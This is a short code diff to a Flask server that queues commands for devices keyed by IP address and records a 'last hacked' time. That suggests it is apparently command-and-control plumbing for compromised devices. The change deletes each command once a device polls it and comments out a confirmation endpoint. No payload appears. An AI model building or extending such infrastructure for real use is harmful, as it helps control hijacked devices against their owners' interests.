@@ -271,21 +271,24 @@ def poll_commands():
     # Update last hacked time
     update_last_seen(device_ip, redis_client, last_hacked=True)
 
+    # Delete the command from the DB
+    redis_client.delete(f"device_command:{device_ip}")
+
     return jsonify(commands)
     
 
-@app.route('/confirm_command', methods=['GET'])
-def confirm_command():
-    # Get the command from the request
-    command = request.args.get('data')
+# @app.route('/confirm_command', methods=['GET'])
+# def confirm_command():
+#     # Get the command from the request
+#     # command = request.args.get('data')
 
-    # Get IP address of the device
-    device_ip = request.remote_addr
+#     # Get IP address of the device
+#     device_ip = request.remote_addr
 
-    # Mark command as executed in DB for the given device
-    redis_client.delete(f"device_command:{device_ip}")
+#     # Mark command as executed in DB for the given device
+#     redis_client.delete(f"device_command:{device_ip}")
 
-    return jsonify({'status': 'success'})
+#     return jsonify({'status': 'success'})
 
 @app.route('/list_view', methods=['GET'])
 def list_view():
